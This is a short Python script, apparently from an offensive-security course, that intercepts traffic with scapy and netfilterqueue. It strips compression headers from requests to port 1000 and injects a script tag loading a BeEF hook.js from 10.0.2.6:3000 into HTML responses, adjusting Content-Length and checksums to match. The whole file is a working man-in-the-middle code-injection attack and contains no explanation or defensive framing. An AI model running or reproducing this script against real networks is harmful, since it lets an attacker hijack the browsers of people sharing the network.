#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, modified_load):
    packet[scapy.Raw].load = modified_load

    del packet[scapy.TCP].chksum
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        print("[+] packet is being processed")
        load = scapy_packet[scapy.Raw].load
        # Firewall authentication request port number =1000
        if scapy_packet[scapy.TCP].dport == 1000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            # if server support HTTP/1.0, then uncomment these line
            # if "HTTP/1.1" in load:
            #     load = load.replace("HTTP/1.1", "HTTP/1.0")
            # print("\n\n")
            # print(load)

        elif scapy_packet[scapy.TCP].sport == 1000:
            print("[+] Response")

            # if user web browser uses HTTP 1.1 then html page is fragmented and thus <body> tag is present in one response
            # injecting js code for beef hooking
            injection_code = '<script src="http://10.0.2.6:3000/hook.js"></script>'
            if "</body>" in load:
                load = load.replace("</body>", injection_code + "</body>")

            # changing content-length attribute
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
            print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("[+] Quitting")
    queue.unbind()
except Exception:
    print("[-] Error")
